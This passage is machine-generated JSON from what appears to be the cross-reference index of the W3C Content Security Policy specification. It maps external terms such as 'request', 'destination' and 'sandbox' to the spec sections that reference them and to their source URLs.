"},{"refs":[{"id":"ref-for-concept-url-scheme\u2460\u2461"}],"title":"6.6.2.7. \n    scheme-part matching\n  "},{"refs":[{"id":"ref-for-concept-url-scheme\u2460\u2462"}],"title":"6.6.2.9. \n    port-part matching\n  "}],"url":"https://url.spec.whatwg.org/#concept-url-scheme"},
"3ae34c95": {"dfnID":"3ae34c95","dfnText":"destination","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-destination"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-concept-request-destination\u2460"},{"id":"ref-for-concept-request-destination\u2461"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-concept-request-destination\u2462"}],"title":"6.1.6. img-src"},{"refs":[{"id":"ref-for-concept-request-destination\u2463"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-concept-request-destination\u2464"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request-destination\u2465"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-concept-request-destination\u2466"},{"id":"ref-for-concept-request-destination\u2467"}],"title":"6.7.1. \n    Get the effective directive for request\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-destination"},
"3be1d4ac": {"dfnID":"3be1d4ac","dfnText":"extracting header list values","external":true,"refSections":[{"refs":[{"id":"ref-for-extract-header-list-values"},{"id":"ref-for-extract-header-list-values\u2460"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "}],"url":"https://fetch.spec.whatwg.org/#extract-header-list-values"},
"3c4b330a": {"dfnID":"3c4b330a","dfnText":"visible to reportingobservers","external":true,"refSections":[{"refs":[{"id":"ref-for-visible-to-reportingobservers"}],"title":"5. \n    Reporting\n  "}],"url":"https://w3c.github.io/reporting/#visible-to-reportingobservers"},
"3da24a47": {"dfnID":"3da24a47","dfnText":"ping","external":true,"refSections":[{"refs":[{"id":"ref-for-ping"}],"title":"6.1.2. connect-src"}],"url":"https://html.spec.whatwg.org/multipage/links.html#ping"},
"3db5ef5f": {"dfnID":"3db5ef5f","dfnText":"ipv4address","external":true,"refSections":[{"refs":[{"id":"ref-for-section-3.2.2"}],"title":"6.6.2.8. \n    host-part matching\n  "}],"url":"https://tools.ietf.org/html/rfc3986#section-3.2.2"},
"3de9e659": {"dfnID":"3de9e659","dfnText":"byte sequence","external":true,"refSections":[{"refs":[{"id":"ref-for-byte-sequence"},{"id":"ref-for-byte-sequence\u2460"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "}],"url":"https://infra.spec.whatwg.org/#byte-sequence"},
"3e12e042": {"dfnID":"3e12e042","dfnText":"environment settings object","external":true,"refSections":[{"refs":[{"id":"ref-for-environment-settings-object"}],"title":"2.2. Policies"}],"url":"https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object"},
"3eef835e": {"dfnID":"3eef835e","dfnText":"@import","external":true,"refSections":[{"refs":[{"id":"ref-for-at-ruledef-import"}],"title":"6.1.14. style-src"}],"url":"https://www.w3.org/TR/css-cascade-5/#at-ruledef-import"},
"3f2ca4de": {"dfnID":"3f2ca4de","dfnText":"current url","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-current-url"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-concept-request-current-url\u2460"},{"id":"ref-for-concept-request-current-url\u2461"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request-current-url\u2462"}],"title":"6.6.2.3. \n    Does request match source list?\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-current-url"},
"41a7917e": {"dfnID":"41a7917e","dfnText":"alpha","external":true,"refSections":[{"refs":[{"id":"ref-for-appendix-B.1"},{"id":"ref-for-appendix-B.1\u2460"},{"id":"ref-for-appendix-B.1\u2461"},{"id":"ref-for-appendix-B.1\u2462"},{"id":"ref-for-appendix-B.1\u2463"},{"id":"ref-for-appendix-B.1\u2464"},{"id":"ref-for-appendix-B.1\u2465"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-appendix-B.1\u2466"},{"id":"ref-for-appendix-B.1\u2467"},{"id":"ref-for-appendix-B.1\u2468"},{"id":"ref-for-appendix-B.1\u2460\u24ea"},{"id":"ref-for-appendix-B.1\u2460\u2460"}],"title":"2.3.1. Source Lists"}],"url":"https://tools.ietf.org/html/rfc5234#appendix-B.1"},
"43ac8374": {"dfnID":"43ac8374","dfnText":"origin (for environment settings object)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-settings-object-origin"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-concept-settings-object-origin\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin"},
"4468342f": {"dfnID":"4468342f","dfnText":"data","external":true,"refSections":[{"refs":[{"id":"ref-for-attr-object-data"}],"title":"6.1.9. object-src"}],"url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data"},
"448c95f9": {"dfnID":"448c95f9","dfnText":"http-equiv","external":true,"refSections":[{"refs":[{"id":"ref-for-attr-meta-http-equiv"}],"title":"3. \n    Policy Delivery\n  "},{"refs":[{"id":"ref-for-attr-meta-http-equiv\u2460"}],"title":"3.3. \n    The <meta> element\n  "},{"refs":[{"id":"ref-for-attr-meta-http-equiv\u2461"}],"title":"4.2. \n    Integration with HTML\n  "}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv"},
"44a7708c": {"dfnID":"44a7708c","dfnText":"EventInit","external":true,"refSections":[{"refs":[{"id":"ref-for-dictdef-eventinit"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"https://dom.spec.whatwg.org/#dictdef-eventinit"},
"450958f7": {"dfnID":"450958f7","dfnText":"unsigned short","external":true,"refSections":[{"refs":[{"id":"ref-for-idl-unsigned-short"}],"title":"5. \n    Reporting\n  "},{"refs":[{"id":"ref-for-idl-unsigned-short\u2460"},{"id":"ref-for-idl-unsigned-short\u2461"}],"title":"5.1. \n    Violation DOM Events\n  "}],"url":"https://webidl.spec.whatwg.org/#idl-unsigned-short"},
"49a6cb20": {"dfnID":"49a6cb20","dfnText":"embed","external":true,"refSections":[{"refs":[{"id":"ref-for-the-embed-element"},{"id":"ref-for-the-embed-element\u2460"}],"title":"6.1.9. object-src"},{"refs":[{"id":"ref-for-the-embed-element\u2461"}],"title":"6.3.2. frame-ancestors"}],"url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element"},
"49f24f5a": {"dfnID":"49f24f5a","dfnText":"queue report","external":true,"refSections":[{"refs":[{"id":"ref-for-queue-report"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://w3c.github.io/reporting/#queue-report"},
"4a4e79bc": {"dfnID":"4a4e79bc","dfnText":"token","external":true,"refSections":[{"refs":[{"id":"ref-for-section-3.2.6"},{"id":"ref-for-section-3.2.6\u2460"}],"title":"6.2.2. sandbox"},{"refs":[{"id":"ref-for-section-3.2.6\u2461"}],"title":"6.4.2. report-to"}],"url":"https://tools.ietf.org/html/rfc7230#section-3.2.6"},
"4b6086d7": {"dfnID":"4b6086d7","dfnText":"global object","external":true,"refSections":[{"refs":[{"id":"ref-for-global-object"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-global-object\u2460"},{"id":"ref-for-global-object\u2461"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-global-object\u2462"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-global-object\u2463"},{"id":"ref-for-global-object\u2464"},{"id":"ref-for-global-object\u2465"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-global-object\u2466"},{"id":"ref-for-global-object\u2467"},{"id":"ref-for-global-object\u2468"},{"id":"ref-for-global-object\u2460\u24ea"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-global-object\u2460\u2460"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-global-object\u2460\u2461"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-global-object\u2460\u2462"},{"id":"ref-for-global-object\u2460\u2463"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-global-object\u2460\u2464"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "}],"url":"https://html.spec.whatwg.org/multipage/webappapis.html#global-object"},
"4c07280e": {"dfnID":"4c07280e","dfnText":"serialize an infra value to json bytes","external":true,"refSections":[{"refs":[{"id":"ref-for-serialize-an-infra-value-to-json-bytes"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "}],"url":"https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes"},
"4d5cebba": {"dfnID":"4d5cebba","dfnText":"report type","external":true,"refSections":[{"refs":[{"id":"ref-for-report-type"}],"title":"5. \n    Reporting\n  "}],"url":"https://w3c.github.io/reporting/#report-type"},
"4f06d0ed": {"dfnID":"4f06d0ed","dfnText":"parse a group of selectors","external":true,"refSections":[{"refs":[{"id":"ref-for-parse-a-group-of-selectors"}],"title":"6.1.14. style-src"}],"url":"https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors"},
"4ffecae2": {"dfnID":"4ffecae2","dfnText":"insert a css rule","external":true,"refSections":[{"refs":[{"id":"ref-for-insert-a-css-rule"}],"title":"6.1.14. style-src"}],"url":"https://www.w3.org/TR/cssom-1/#insert-a-css-rule"},
"50b05fad": {"dfnID":"50b05fad","dfnText":"method","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-method"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-method"},
"53275e46": {"dfnID":"53275e46","dfnText":"append (for list)","external":true,"refSections":[{"refs":[{"id":"ref-for-list-append"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "}],"url":"https://infra.spec.whatwg.org/#list-append"},
"53f0ea4e": {"dfnID":"53f0ea4e","dfnText":"parse a sandboxing directive","external":true,"refSections":[{"refs":[{"id":"ref-for-parse-a-sandboxing-directive"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-parse-a-sandboxing-directive\u2460"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "}],"url":"https://html.spec.whatwg.org/multipage/browsers.html#parse-a-sandboxing-directive"},
"5442ea33": {"dfnID":"5442ea33","dfnText":"url serializer","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-url-serializer"},{"id":"ref-for-concept-url-serializer\u2460"},{"id":"ref-for-concept-url-serializer\u2461"},{"id":"ref-for-concept-url-serializer\u2462"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-concept-url-serializer\u2463"},{"id":"ref-for-concept-url-serializer\u2464"},{"id":"ref-for-concept-url-serializer\u2465"},{"id":"ref-for-concept-url-serializer\u2466"},{"id":"ref-for-concept-url-serializer\u2467"},{"id":"ref-for-concept-url-serializer\u2468"},{"id":"ref-for-concept-url-serializer\u2460\u24ea"},{"id":"ref-for-concept-url-serializer\u2460\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://url.spec.whatwg.org/#concept-url-serializer"},
"546e361d": {"dfnID":"546e361d","dfnText":"path-absolute","external":true,"refSections":[{"refs":[{"id":"ref-for-section-3.3"},{"id":"ref-for-section-3.3\u2460"}],"title":"2.3.1. Source Lists"}],"url":"https://tools.ietf.org/html/rfc3986#section-3.3"},
"55213b5b": {"dfnID":"55213b5b","dfnText":"request","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request"},{"id":"ref-for-concept-request\u2460"},{"id":"ref-for-concept-request\u2461"},{"id":"ref-for-concept-request\u2462"},{"id":"ref-for-concept-request\u2463"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-concept-request\u2464"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-concept-request\u2465"},{"id":"ref-for-concept-request\u2466"},{"id":"ref-for-concept-request\u2467"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-concept-request\u2468"}],"title":"4.1.2. \n    Report Content Security Policy violations for request\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u24ea"}],"title":"4.1.3. \n    Should request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u2460"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u2461"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u2462"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u2463"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u2464"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u2465"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-concept-request\u2460\u2466"},{"id":"ref-for-concept-request\u2460\u2467"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-concept-request\u2460\u2468"}],"title":"6.1.1.1. \n    child-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u24ea"}],"title":"6.1.1.2. \n    child-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2460"}],"title":"6.1.2. connect-src"},{"refs":[{"id":"ref-for-concept-request\u2461\u2461"}],"title":"6.1.2.1. \n    connect-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2462"}],"title":"6.1.2.2. \n    connect-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2463"}],"title":"6.1.3.1. \n    default-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2464"}],"title":"6.1.3.2. \n    default-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2465"}],"title":"6.1.4.1. \n    font-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2466"}],"title":"6.1.4.2. \n    font-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2467"}],"title":"6.1.5.1. \n    frame-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2461\u2468"}],"title":"6.1.5.2. \n    frame-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u24ea"},{"id":"ref-for-concept-request\u2462\u2460"}],"title":"6.1.6. img-src"},{"refs":[{"id":"ref-for-concept-request\u2462\u2461"}],"title":"6.1.6.1. \n    img-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u2462"}],"title":"6.1.6.2. \n    img-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u2463"}],"title":"6.1.7.1. \n    manifest-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u2464"}],"title":"6.1.7.2. \n    manifest-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u2465"}],"title":"6.1.8.1. \n    media-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u2466"}],"title":"6.1.8.2. \n    media-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u2467"}],"title":"6.1.9.1. \n    object-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2462\u2468"}],"title":"6.1.9.2. \n    object-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u24ea"}],"title":"6.1.10.1. \n    prefetch-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u2460"}],"title":"6.1.10.2. \n    prefetch-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u2461"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-concept-request\u2463\u2462"}],"title":"6.1.11.1. \n    script-src Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u2463"}],"title":"6.1.11.2. \n    script-src Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u2464"}],"title":"6.1.12.1. \n    script-src-elem Pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u2465"}],"title":"6.1.12.2. \n    script-src-elem Post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u2466"}],"title":"6.1.14. style-src"},{"refs":[{"id":"ref-for-concept-request\u2463\u2467"}],"title":"6.1.14.1. \n    style-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2463\u2468"}],"title":"6.1.14.2. \n    style-src Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u24ea"}],"title":"6.1.15.1. \n    style-src-elem Pre-request Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2460"}],"title":"6.1.15.2. \n    style-src-elem Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2461"}],"title":"6.1.17.1. \n    worker-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2462"}],"title":"6.1.17.2. \n    worker-src Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2463"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2464"}],"title":"6.3.1.1. \n    form-action Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2465"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2466"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2467"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-concept-request\u2464\u2468"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2465\u24ea"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-concept-request\u2465\u2460"}],"title":"6.6.2.1. \n    Does request violate policy?\n  "},{"refs":[{"id":"ref-for-concept-request\u2465\u2461"}],"title":"6.6.2.2. \n    Does nonce match source list?\n  "},{"refs":[{"id":"ref-for-concept-request\u2465\u2462"},{"id":"ref-for-concept-request\u2465\u2463"}],"title":"6.6.2.3. \n    Does request match source list?\n  "},{"refs":[{"id":"ref-for-concept-request\u2465\u2464"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "},{"refs":[{"id":"ref-for-concept-request\u2465\u2465"},{"id":"ref-for-concept-request\u2465\u2466"}],"title":"6.7.1. \n    Get the effective directive for request\n  "},{"refs":[{"id":"ref-for-concept-request\u2465\u2467"}],"title":"6.7.2. \n    Get the effective directive for inline checks\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request"},
"56c6bafc": {"dfnID":"56c6bafc","dfnText":"href","external":true,"refSections":[{"refs":[{"id":"ref-for-attr-base-href"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-attr-base-href\u2460"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href"},
"570073d7": {"dfnID":"570073d7","dfnText":"ServiceWorker","external":true,"refSections":[{"refs":[{"id":"ref-for-serviceworker"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-serviceworker\u2460"}],"title":"6.1.17. worker-src"}],"url":"https://www.w3.org/TR/service-workers/#serviceworker"},
"5718c334": {"dfnID":"5718c334","dfnText":"host (for URL)","external":true,"refSections":[{"refs":[{"id":"ref-for-dom-url-host"},{"id":"ref-for-dom-url-host\u2460"},{"id":"ref-for-dom-url-host\u2461"},{"id":"ref-for-dom-url-host\u2462"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "}],"url":"https://url.spec.whatwg.org/#dom-url-host"},
"574c86b8": {"dfnID":"574c86b8","dfnText":"ReportBody","external":true,"refSections":[{"refs":[{"id":"ref-for-reportbody"}],"title":"5. \n    Reporting\n  "}],"url":"https://www.w3.org/TR/reporting-1/#reportbody"},
"5a88c1c3": {"dfnID":"5a88c1c3","dfnText":"content","external":true,"refSections":[{"refs":[{"id":"ref-for-attr-meta-content"}],"title":"3.3. \n    The <meta> element\n  "}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content"},
"5c35dd47": {"dfnID":"5c35dd47","dfnText":"sandbox","external":true,"refSections":[{"refs":[{"id":"ref-for-attr-iframe-sandbox"},{"id":"ref-for-attr-iframe-sandbox\u2460"}],"title":"6.2.2. sandbox"}],"url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox"},
"5d346c26": {"dfnID":"5d346c26","dfnText":"ows","external":true,"refSections":[{"refs":[{"id":"ref-for-section-3.2.3"}],"title":"2.1. Infrastructure"}],"url":"https://tools.ietf.org/html/rfc7230#section-3.2.3"},
"5d7209e9": {"dfnID":"5d7209e9","dfnText":"Window","external":true,"refSections":[{"refs":[{"id":"ref-for-window"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-window\u2460"}],"title":"4.2.3. \n    Retrieve the CSP list of an object\n  "},{"refs":[{"id":"ref-for-window\u2461"},{"id":"ref-for-window\u2462"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://html.spec.whatwg.org/multipage/nav-history-apis.html#window"},
"5e345b1c": {"dfnID":"5e345b1c","dfnText":"target browsing context","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-target-browsing-context"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-concept-request-target-browsing-context\u2460"}],"title":"6.7.1. \n    Get the effective directive for request\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-target-browsing-context"},
"5e72f9d3": {"dfnID":"5e72f9d3","dfnText":"infra","external":true,"refSections":[{"refs":[{"id":"ref-for-something"}],"title":"2.1. Infrastructure"}],"url":"https://infra.spec.whatwg.org/#"},
"5fb1ed8a": {"dfnID":"5fb1ed8a","dfnText":"ascii whitespace","external":true,"refSections":[{"refs":[{"id":"ref-for-ascii-whitespace"}],"title":"2.1. Infrastructure"},{"refs":[{"id":"ref-for-ascii-whitespace\u2460"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "}],"url":"https://infra.spec.whatwg.org/#ascii-whitespace"},
"5fd23811": {"dfnID":"5fd23811","dfnText":"fire an event","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-event-fire"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://dom.spec.whatwg.org/#concept-event-fire"},
"60184fa5": {"dfnID":"60184fa5","dfnText":"collecting a sequence of code points","external":true,"refSections":[{"refs":[{"id":"ref-for-collect-a-sequence-of-code-points"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "}],"url":"https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points"},
"63340982": {"dfnID":"63340982","dfnText":"local scheme","external":true,"refSections":[{"refs":[{"id":"ref-for-local-scheme"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-local-scheme\u2460"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-local-scheme\u2461"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-local-scheme\u2462"},{"id":"ref-for-local-scheme\u2463"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-local-scheme\u2464"}],"title":"7.8. \n    CSP Inheriting to avoid bypasses\n  "}],"url":"https://fetch.spec.whatwg.org/#local-scheme"},
"649608b9": {"dfnID":"649608b9","dfnText":"list","external":true,"refSections":[{"refs":[{"id":"ref-for-list"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-list\u2460"},{"id":"ref-for-list\u2461"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "}],"url":"https://infra.spec.whatwg.org/#list"},
"64b62ea0": {"dfnID":"64b62ea0","dfnText":"redirect mode","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-redirect-mode"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-redirect-mode"},
"64b89595": {"dfnID":"64b89595","dfnText":"meta","external":true,"refSections":[{"refs":[{"id":"ref-for-meta"}],"title":"3. \n    Policy Delivery\n  "},{"refs":[{"id":"ref-for-meta\u2460"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-meta\u2461"},{"id":"ref-for-meta\u2462"},{"id":"ref-for-meta\u2463"},{"id":"ref-for-meta\u2464"},{"id":"ref-for-meta\u2465"},{"id":"ref-for-meta\u2466"},{"id":"ref-for-meta\u2467"}],"title":"3.3. \n    The <meta> element\n  "},{"refs":[{"id":"ref-for-meta\u2468"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-meta\u2460\u24ea"}],"title":"6.2.2. sandbox"},{"refs":[{"id":"ref-for-meta\u2460\u2460"}],"title":"6.3.2. frame-ancestors"}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#meta"},
"656bb36c": {"dfnID":"656bb36c","dfnText":"realm","external":true,"refSections":[{"refs":[{"id":"ref-for-realm"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "}],"url":"https://tc39.github.io/ecma262#realm"},
"68bf3d31": {"dfnID":"68bf3d31","dfnText":"a","external":true,"refSections":[{"refs":[{"id":"ref-for-the-a-element"}],"title":"6.1.2. connect-src"},{"refs":[{"id":"ref-for-the-a-element\u2460"}],"title":"6.3.3. navigate-to"}],"url":"https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element"},
"692595fe": {"dfnID":"692595fe","dfnText":"ordered set","external":true,"refSections":[{"refs":[{"id":"ref-for-ordered-set"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-ordered-set\u2460"},{"id":"ref-for-ordered-set\u2461"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-ordered-set\u2462"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-ordered-set\u2463"},{"id":"ref-for-ordered-set\u2464"}],"title":"6.7.3. \n    Get fetch directive fallback list\n  "}],"url":"https://infra.spec.whatwg.org/#ordered-set"},
"6b815fdd": {"dfnID":"6b815fdd","dfnText":"is empty","external":true,"refSections":[{"refs":[{"id":"ref-for-list-is-empty"}],"title":"2.3. Directives"}],"url":"https://infra.spec.whatwg.org/#list-is-empty"},
"6cfa013d": {"dfnID":"6cfa013d","dfnText":"link","external":true,"refSections":[{"refs":[{"id":"ref-for-the-link-element"}],"title":"3.3. \n    The <meta> element\n  "},{"refs":[{"id":"ref-for-the-link-element\u2460"}],"title":"6.1.14. style-src"}],"url":"https://html.spec.whatwg.org/multipage/semantics.html#the-link-element"},
"6ee0eab1": {"dfnID":"6ee0eab1","dfnText":"header list (for request)","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-header-list"}],"title":"5.3. \n    Report a violation\n  "}],"url":"https://fetch.spec.whatwg.org/#concept-request-header-list"},
"6f2dfa22": {"dfnID":"6f2dfa22","dfnText":"ascii lowercase","external":true,"refSections":[{"refs":[{"id":"ref-for-ascii-lowercase"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "}],"url":"https://infra.spec.whatwg.org/#ascii-lowercase"},
"702d8ead": {"dfnID":"702d8ead","dfnText":"digit","external":true,"refSections":[{"refs":[{"id":"ref-for-appendix-B.1"},{"id":"ref-for-appendix-B.1\u2460"},{"id":"ref-for-appendix-B.1\u2461"},{"id":"ref-for-appendix-B.1\u2462"},{"id":"ref-for-appendix-B.1\u2463"},{"id":"ref-for-appendix-B.1\u2464"},{"id":"ref-for-appendix-B.1\u2465"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-appendix-B.1\u2466"},{"id":"ref-for-appendix-B.1\u2467"},{"id":"ref-for-appendix-B.1\u2468"},{"id":"ref-for-appendix-B.1\u2460\u24ea"},{"id":"ref-for-appendix-B.1\u2460\u2460"}],"title":"2.3.1. Source Lists"}],"url":"https://tools.ietf.org/html/rfc5234#appendix-B.1"},
"7414e9fd": {"dfnID":"7414e9fd","dfnText":"Function()","external":true,"refSections":[{"refs":[{"id":"ref-for-sec-function-objects"}],"title":"6.1.11. script-src"}],"url":"https://tc39.github.io/ecma262#sec-function-objects"},
"784f01de": {"dfnID":"784f01de","dfnText":"cryptographic nonce metadata","external":true,"refSections":[{"refs":[{"id":"ref-for-concept-request-nonce-metadata"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-concept-request-nonce-metadata\u2460"}],"title":"6.1.14.1. \n    style-src Pre-request Check\n  "},{"refs":[{"id":"ref-for-concept-request-nonce-metadata\u2461"}],"title":"6.1.14.2. \n    style-src Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-request-nonce-metadata\u2462"}],"title":"6.1.15.1. \n    style-src-elem Pre-request Check\n  "},{"refs":[{"id":"ref-for-concept-request-nonce-metadata\u2463"}],"title":"6.1.15.2. \n    style-src-elem Post-request Check\n  "},{"refs":[{"id":"ref-for-concept-request-nonce-metadata\u2464"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  